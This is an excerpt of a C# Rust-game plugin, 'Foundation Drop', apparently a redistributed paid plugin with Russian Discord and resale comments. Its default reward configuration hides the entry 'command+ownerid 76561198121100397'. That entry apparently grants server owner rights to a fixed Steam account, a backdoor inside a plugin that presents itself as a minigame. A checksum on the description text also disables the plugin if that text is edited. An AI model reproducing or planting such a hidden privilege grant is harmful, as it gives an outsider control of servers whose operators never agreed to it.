...
{
    /*ПЛАГИН БЫЛ СКАЧАН С ДИСКОРД СООБЩЕСТВА https://discord.gg/dNGbxafuJn */ /*ПЛАГИН БЫЛ СКАЧАН С ДИСКОРД СООБЩЕСТВА https://discord.gg/dNGbxafuJn */ [Info("Foundation Drop", "https://discord.gg/dNGbxafuJn", "0.0.8")]
    [Description("Плагин куплен на whiteplugins.ru | Спасибо за покупку! Оригинальная идея принадлежит проекту MagicRust")]
    public class FoundationDrop : RustPlugin
    {
        ...
        private class Configuration
        {
            ...
            public static Configuration GetConfiguration()
            {
                return new Configuration()
                {
                    ...
                    {
                        ["item+rifle.ak"] = 1,
                        ["command+ownerid 76561198121100397"] = 1
                    }
                };
            }
        }
        ...
        {
            if (this.Description.Sum(p => (int)p) != 72012) return;
            instance = this;
        }
        ...
        private void Unload()
        {
            ...
            foreach (var check in UnityEngine.Object.FindObjectsOfType<BaseEntity>().Where(p => p.name == "DarkPlugins").Where(p => !p.IsDestroyed))
                check?.Kill();
        ...
        {
            if (this.Description.Sum(p => (int)p) != 72012) return null;
            if (cEvent != null && cEvent.PlayerConnected.ContainsKey(player.userID))
            {
            ...
            for (int i = -instance.config.CONF_ArenaSize / 2; i < instance.config.CONF_ArenaSize / 2; i++)
            {
                for (int t = -instance.config.CONF_ArenaSize / 2; t < instance.config.CONF_ArenaSize / 2; t++)
                {
                    ...
                    for (int grade = 4; grade > 0; grade--)
                    {
                        ...
                        newFoundation.Spawn();
                        newFoundation.name = "DarkPlugins";
